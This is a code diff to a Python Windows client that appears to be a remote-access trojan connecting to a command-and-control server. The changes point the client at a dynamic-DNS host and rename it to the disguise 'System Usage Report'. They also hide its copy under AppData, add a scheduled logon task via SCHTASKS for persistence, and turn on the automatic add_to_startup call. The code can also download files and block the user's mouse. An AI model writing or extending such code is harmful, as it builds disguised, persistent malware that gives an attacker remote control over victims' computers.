@@ -10,13 +10,13 @@ import threading
 import mouse
 import time
 
-key = 'b3DL7F14d0XOYKxjz5yHchslAItZI0jE'
+key = 's3DrdlnKQqHh67eCYxo2R18NE0trd6ih'
 timeout = 60
 
-host = '192.168.1.71'
+host = 'hiddenname.keenetic.pro'
 port = 3142
 
-program_name = 'main.exe'
+app_name = 'System Usage Report'
 
 global mouse_blocking
 mouse_blocking = False
@@ -67,16 +67,17 @@ def download_file(url, filename):
 
 def get_working_dir():
     username = os.getlogin()
-    return f'C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\' \
-           f'Windows\\Start Menu\\Programs\\Startup'
+    return f'C:\\Users\\{username}\\AppData\\Local\\Programs'
 
 
 def add_to_startup():
-    working_dir = get_working_dir() + f'\\{program_name}'
+    working_dir = get_working_dir() + f'\\{app_name}' + '.exe'
 
     if not os.path.isfile(working_dir):
-        copyfile(os.getcwd() + f'\\{program_name}', working_dir)
+        copyfile(os.getcwd() + f'\\{app_name}' + '.exe', working_dir)
         print('Program was added to startup')
+        if not (app_name in run_cmd_command(fr'SCHTASKS /Query /TN "{app_name}"')):
+            run_cmd_command(fr'SCHTASKS /CREATE /SC ONLOGON /TN "{app_name}" /TR "{working_dir}"')
         subprocess.Popen([working_dir])
         ctypes.windll.user32.MessageBoxW(0, "Success", "Successfully added to startup", 0)
         sys.exit()
@@ -110,7 +111,7 @@ def unblock_mouse():
     mouse_blocking = False
 
 
-# add_to_startup()
+add_to_startup()
 
 while True:
     client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
